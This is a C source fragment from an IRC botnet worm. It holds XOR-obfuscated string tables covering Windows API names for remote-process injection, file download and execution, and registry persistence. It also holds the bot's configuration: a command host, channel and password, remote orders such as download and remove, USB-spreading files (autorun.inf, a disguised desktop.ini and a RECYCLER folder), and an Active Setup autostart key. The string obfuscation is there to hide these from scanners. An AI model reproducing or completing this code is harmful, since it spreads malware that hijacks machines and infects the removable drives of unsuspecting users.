char *apistr[] =
{
#define s_kernel32 0
	"\xC0\xCE\xD9\xC5\xCE\xC7\x98\x99\x85\xCF\xC7\xC7",
#define s_ws2_32 1
	"\xDC\xD8\x99\xF4\x98\x99\x85\xCF\xC7\xC7",
#define s_wininet 2
	"\xDC\xC2\xC5\xC2\xC5\xCE\xDF\x85\xCF\xC7\xC7", 
#define s_shell32 3
	"\xD8\xC3\xCE\xC7\xC7\x98\x99\x85\xCF\xC7\xC7", 
#define s_advapi32 4
	"\xCA\xCF\xDD\xCA\xDB\xC2\x98\x99\x85\xCF\xC7\xC7",
#define s_CreateToolhelp32Snapshot 5
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFF\xC4\xC4\xC7\xC3\xCE\xC7\xDB\x98\x99\xF8\xC5\xCA\xDB\xD8\xC3\xC4\xDF",
#define s_Process32First 6
	"\xFB\xD9\xC4\xC8\xCE\xD8\xD8\x98\x99\xED\xC2\xD9\xD8\xDF",
#define s_Process32Next 7
	"\xFB\xD9\xC4\xC8\xCE\xD8\xD8\x98\x99\xE5\xCE\xD3\xDF",
#define s_OpenProcess 8
	"\xE4\xDB\xCE\xC5\xFB\xD9\xC4\xC8\xCE\xD8\xD8",
#define s_GetModuleFileNameA 9
	"\xEC\xCE\xDF\xE6\xC4\xCF\xDE\xC7\xCE\xED\xC2\xC7\xCE\xE5\xCA\xC6\xCE\xEA",
#define s_VirtualAllocEx 10
	"\xFD\xC2\xD9\xDF\xDE\xCA\xC7\xEA\xC7\xC7\xC4\xC8\xEE\xD3",
#define s_ZwWriteVirtualMemory 11
	"\xF1\xDC\xFC\xD9\xC2\xDF\xCE\xFD\xC2\xD9\xDF\xDE\xCA\xC7\xE6\xCE\xC6\xC4\xD9\xD2",
#define s_CreateRemoteThread 12
	"\xE8\xD9\xCE\xCA\xDF\xCE\xF9\xCE\xC6\xC4\xDF\xCE\xFF\xC3\xD9\xCE\xCA\xCF",
#define s_WaitForSingleObject 13
	"\xFC\xCA\xC2\xDF\xED\xC4\xD9\xF8\xC2\xC5\xCC\xC7\xCE\xE4\xC9\xC1\xCE\xC8\xDF",
#define s_CreateMutexA 14
	"\xE8\xD9\xCE\xCA\xDF\xCE\xE6\xDE\xDF\xCE\xD3\xEA",
#define s_CreateThread 15
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFF\xC3\xD9\xCE\xCA\xCF",
#define s_ExitThread 16
	"\xEE\xD3\xC2\xDF\xFF\xC3\xD9\xCE\xCA\xCF", 
#define s_Sleep 17
	"\xF8\xC7\xCE\xCE\xDB",
#define s_GetTickCount 18
	"\xEC\xCE\xDF\xFF\xC2\xC8\xC0\xE8\xC4\xDE\xC5\xDF", 
#define s_CreateFileA 19
	"\xE8\xD9\xCE\xCA\xDF\xCE\xED\xC2\xC7\xCE\xEA", 
#define s_WriteFile 20
	"\xFC\xD9\xC2\xDF\xCE\xED\xC2\xC7\xCE", 
#define s_CloseHandle 21
	"\xE8\xC7\xC4\xD8\xCE\xE3\xCA\xC5\xCF\xC7\xCE", 
#define s_CreateProcessA 22
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFB\xD9\xC4\xC8\xCE\xD8\xD8\xEA", 
#define s_GetLogicalDriveStringsA 23
	"\xEC\xCE\xDF\xE7\xC4\xCC\xC2\xC8\xCA\xC7\xEF\xD9\xC2\xDD\xCE\xF8\xDF\xD9\xC2\xC5\xCC\xD8\xEA", 
#define s_GetDriveTypeA 24
	"\xEC\xCE\xDF\xEF\xD9\xC2\xDD\xCE\xFF\xD2\xDB\xCE\xEA", 
#define s_CreateDirectoryA 25
	"\xE8\xD9\xCE\xCA\xDF\xCE\xEF\xC2\xD9\xCE\xC8\xDF\xC4\xD9\xD2\xEA", 
#define s_GetLastError 26
	"\xEC\xCE\xDF\xE7\xCA\xD8\xDF\xEE\xD9\xD9\xC4\xD9", 
#define s_SetFileAttributesA 27
	"\xF8\xCE\xDF\xED\xC2\xC7\xCE\xEA\xDF\xDF\xD9\xC2\xC9\xDE\xDF\xCE\xD8\xEA", 
#define s_CopyFileA 28
	"\xE8\xC4\xDB\xD2\xED\xC2\xC7\xCE\xEA", 
#define s_DeleteFileA 29
	"\xEF\xCE\xC7\xCE\xDF\xCE\xED\xC2\xC7\xCE\xEA", 
#define s_lstrlen 30
	"\xC7\xD8\xDF\xD9\xC7\xCE\xC5", 
#define s_lstrcat 31
	"\xC7\xD8\xDF\xD9\xC8\xCA\xDF", 
#define s_lstrcmp 32
	"\xC7\xD8\xDF\xD9\xC8\xC6\xDB", 
#define s_lstrcmpi 33
	"\xC7\xD8\xDF\xD9\xC8\xC6\xDB\xC2", 
#define s_lstrcpyn 34
	"\xC7\xD8\xDF\xD9\xC8\xDB\xD2\xC5", 
#define s_WSAStartup 35
	"\xFC\xF8\xEA\xF8\xDF\xCA\xD9\xDF\xDE\xDB", 
#define s_socket 36
	"\xD8\xC4\xC8\xC0\xCE\xDF", 
#define s_connect 37
	"\xC8\xC4\xC5\xC5\xCE\xC8\xDF", 
#define s_inet_addr 38
	"\xC2\xC5\xCE\xDF\xF4\xCA\xCF\xCF\xD9", 
#define s_htons 39
	"\xC3\xDF\xC4\xC5\xD8", 
#define s_send 40
	"\xD8\xCE\xC5\xCF", 
#define s_recv 41
	"\xD9\xCE\xC8\xDD", 
#define s_closesocket 42
	"\xC8\xC7\xC4\xD8\xCE\xD8\xC4\xC8\xC0\xCE\xDF", 
#define s_gethostbyname 43
	"\xCC\xCE\xDF\xC3\xC4\xD8\xDF\xC9\xD2\xC5\xCA\xC6\xCE",
#define s_InternetOpenA 44
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE4\xDB\xCE\xC5\xEA",
#define s_InternetOpenUrlA 45
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE4\xDB\xCE\xC5\xFE\xD9\xC7\xEA",
#define s_InternetCloseHandle 46
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE8\xC7\xC4\xD8\xCE\xE3\xCA\xC5\xCF\xC7\xCE",
#define s_InternetReadFile 47
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xF9\xCE\xCA\xCF\xED\xC2\xC7\xCE",
#define s_ShellExecuteA 48
	"\xF8\xC3\xCE\xC7\xC7\xEE\xD3\xCE\xC8\xDE\xDF\xCE\xEA",
#define s_RegCreateKeyExA 49
	"\xF9\xCE\xCC\xE8\xD9\xCE\xCA\xDF\xCE\xE0\xCE\xD2\xEE\xD3\xEA",
#define s_RegSetValueExA 50
	"\xF9\xCE\xCC\xF8\xCE\xDF\xFD\xCA\xC7\xDE\xCE\xEE\xD3\xEA",
#define s_RegCloseKey 51
	"\xF9\xCE\xCC\xE8\xC7\xC4\xD8\xCE\xE0\xCE\xD2",
#define s_RegDeleteKeyA 52
	"\xF9\xCE\xCC\xEF\xCE\xC7\xCE\xDF\xCE\xE0\xCE\xD2\xEA",
#define s_RegDeleteValueA 53
	"\xF9\xCE\xCC\xEF\xCE\xC7\xCE\xDF\xCE\xFD\xCA\xC7\xDE\xCE\xEA",
#define s_ntdll 54
	"\xC5\xDF\xCF\xC7\xC7\x85\xCF\xC7\xC7",
	NULL
};

strings_s strings[] =
{
	/**************CONFIG-MAIN****************/
	#define s_decodekey 0
	{"\xDA\xDA\xDA\x9A\x99\x98", 1},
	#define s_filename 1
	{"\xCA\xDE\xDF\xC4\xD9\xDE\xC5\x85\xCE\xD3\xCE", 1},
	#define s_mutex 2
	{"\xC7\xC0\xCA\xC0\xD8\xCC", 1},
	#define s_autostartkey 3
	{"\xD0\x9B\x93\xE9\x9B\xEE\x9E\xE8\x9B\x86\x9F\xED\xE8\xE9\x86\x9A\x9A\xE8\xED\x86\xEA\xEA\xF3\x9E\x86\x9B\x9B\x9F\x9B\x9A\xE8\x9D\x9B\x93\x9E\x9A\x99\xD6", 1},
	#define s_botversion 4
	{"\xC9\xCE\xDF\xCA\x8B\xDF\xCE\xD8\xDF\x8B\xDD\x9B\x85\x9A", 1},
	#define s_ircorderprefix 5
	{"\x8A", 1},
	#define s_masterhost 6
	{"\xCD\xC9\xC2\x85\xCC\xC4\xDD", 1},
	#define s_password 7
	{NULL, 1},
	#define s_channel 8
	{"\x88\xDB\xCE\xCF\xCE\xD9\xC2", 1},
	#define s_channelpass 9
	{"\xC0\xDE\xD9\xC8\xCE\xDD\xDF\xCE\xD8\xDF", 1},
	#define s_channel_usb 10
	{"\x88\xDE\xD8\xC9", 1},
	/**************CONFIG-ORDERS****************/
	#define s_order_version 11
	{"\xDD", 1},
	#define s_order_die 12
	{"\xCF", 1},
	#define s_order_r 13
	{"\xD9", 1},
	#define s_order_r2 14
	{"\xDA", 1},
	#define s_order_remove 15
	{"\xC4\xCF\xD8\xDF\xD9\xCA\xC5\xC2", 1},
	#define s_order_dl 16
	{"\xC5\xCA\xC7\xC4\xD1\xC2", 1},
	#define s_order_join 17
	{"\xC1", 1},
	#define s_order_part 18
	{"\xDB", 1},
	/**************IRC STRINGS****************/
	#define s_pass 19
	{"\xFB\xEA\xF8\xF8\x8B", 1},
	#define s_nick 20
	{"\xE5\xE2\xE8\xE0\x8B\xFD\xC2\xD9\xDE\xD8\x86", 1},
	#define s_user 21
	{"\xFE\xF8\xEE\xF9\x8B", 1},
	#define s_motd 24
	{"\xE6\xE4\xFF\xEF", 1},
	#define s_ping 25
	{"\xFB\xE2\xE5\xEC", 1},
	#define s_pong 26
	{"\xFB\xE4\xE5\xEC\x8B", 1},
	#define s_join 27
	{"\xE1\xE4\xE2\xE5\x8B", 1},
	#define s_part 28
	{"\xFB\xEA\xF9\xFF\x8B", 1},
	#define s_privmsg 29
	{"\xFB\xF9\xE2\xFD\xE6\xF8\xEC", 1},
	#define s_332 30
	{"\x98\x98\x99", 1},
	#define s_433 31
	{"\x9F\x98\x98", 1},
	#define s_dbldot 32
	{"\x8B\x91", 1},
	#define s_space 34
	{"\x8B", 1},
	#define s_usb_infect 35
	{"\xA8\x9B\x87\x9A\xA9\xFD\xC2\xD9\xDE\xD8\x8B\xE4\xDC\xC5\x98\xCF\x8B\xA8\x9B\xFE\xF8\xE9\x8B\xEF\xD9\xC2\xDD\xCE\xD9\xA8\x9F\x8B", 1},
	/**************DOWNLOADER STRINGS****************/
	#define s_internetopen 36
	{"\xE6\xC4\xD1\xC2\xC7\xC7\xCA", 1},
	#define s_success 37
	{"\xF8\xDE\xC8\xC8\xCE\xD8\xD8\x85", 1},
	#define s_failed 38
	{"\xED\xCA\xC2\xC7\xCE\xCF\x85", 1},
	/**************USB-SPREAD STRINGS****************/
	#define s_usb_recycler 39
	{"\xF7\xF9\xEE\xF8\xFF\xE4\xF9\xEE", 1},
	#define s_usb_recsubdir 40
	{"\xF7\xF8\x86\x9A\x86\x9E\x86\x99\x9A\x86\x9A\x9F\x93\x99\x9F\x9C\x9D\x9E\x9B\x9A\x86\x9A\x9D\x9F\x9F\x9F\x92\x9A\x92\x98\x9C\x86\x9D\x93\x99\x9B\x9B\x98\x98\x98\x9B\x86\x9A\x9B\x9A\x98", 1},
	#define s_usb_desktopinidata 41
	{"\xF0\x85\xF8\xC3\xCE\xC7\xC7\xE8\xC7\xCA\xD8\xD8\xE2\xC5\xCD\xC4\xF6\xA1\xE8\xE7\xF8\xE2\xEF\x96\xD0\x9D\x9F\x9E\xED\xED\x9B\x9F\x9B\x86\x9E\x9B\x93\x9A\x86\x9A\x9B\x9A\xE9\x86\x92\xED\x9B\x93\x86\x9B\x9B\xEA\xEA\x9B\x9B\x99\xED\x92\x9E\x9F\xEE\xD6", 1},
	#define s_usb_desktopini 42
	{"\xF7\xEF\xCE\xD8\xC0\xDF\xC4\xDB\x85\xC2\xC5\xC2", 1},
	#define s_usb_autoruninf 43
	{"\xF7\xCA\xDE\xDF\xC4\xD9\xDE\xC5\x85\xC2\xC5\xCD", 1},
	#define s_usb_autorundata1 44
	{"\xF0\xCA\xDE\xDF\xC4\xD9\xDE\xC5\xF6\xA1\xC4\xDB\xCE\xC5\x96", 1},
	#define s_usb_autorundata2 45
	{"\xA1\xC2\xC8\xC4\xC5\x96\x8E\xF8\xD2\xD8\xDF\xCE\xC6\xF9\xC4\xC4\xDF\x8E\xF7\xD8\xD2\xD8\xDF\xCE\xC6\x98\x99\xF7\xF8\xE3\xEE\xE7\xE7\x98\x99\x85\xCF\xC7\xC7\x87\x9F\xA1\xCA\xC8\xDF\xC2\xC4\xC5\x96\xE4\xDB\xCE\xC5\x8B\xCD\xC4\xC7\xCF\xCE\xD9\x8B\xDF\xC4\x8B\xDD\xC2\xCE\xDC\x8B\xCD\xC2\xC7\xCE\xD8\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\x96\xE4\xDB\xCE\xC5\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\xF7\xC8\xC4\xC6\xC6\xCA\xC5\xCF\x96", 1},
	#define s_usb_autorundata3 46
	{"\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\xF7\xCF\xCE\xCD\xCA\xDE\xC7\xDF\x96\x9A", 1},
	/**************INSTALL STRINGS****************/
	#define s_c 47
	{"\xC8\x91", 1},
	#define s_dblslash 48
	{"\xF7", 1},
	/**************AUTOSTART STRINGS****************/
	#define s_autostartreg 49
	{"\xF8\xC4\xCD\xDF\xDC\xCA\xD9\xCE\xF7\xE6\xC2\xC8\xD9\xC4\xD8\xC4\xCD\xDF\xF7\xEA\xC8\xDF\xC2\xDD\xCE\x8B\xF8\xCE\xDF\xDE\xDB\xF7\xE2\xC5\xD8\xDF\xCA\xC7\xC7\xCE\xCF\x8B\xE8\xC4\xC6\xDB\xC4\xC5\xCE\xC5\xDF\xD8", 1},
	#define s_stubpath 50
	{"\xF8\xDF\xDE\xC9\xFB\xCA\xDF\xC3", 1},
	#define s_autostartreg_guestacc 51
	{"\xF8\xC4\xCD\xDF\xDC\xCA\xD9\xCE\xF7\xE6\xC2\xC8\xD9\xC4\xD8\xC4\xCD\xDF\xF7\xFC\xC2\xC5\xCF\xC4\xDC\xD8\xF7\xE8\xDE\xD9\xD9\xCE\xC5\xDF\xFD\xCE\xD9\xD8\xC2\xC4\xC5\xF7\xF9\xDE\xC5", 1},
	#define s_autostartreg_def 52
	{"\xFF\xCE\xD8\xDF\xCE\xD9", 1},
	/**************MISC****************/
	#define s_order_silent 53
	{"\xD8", 1},
	#define s_star 54
	{"\x81", 1},
	#define laststring 55
	{NULL, 0}
};
char decode_key[] = "f424";
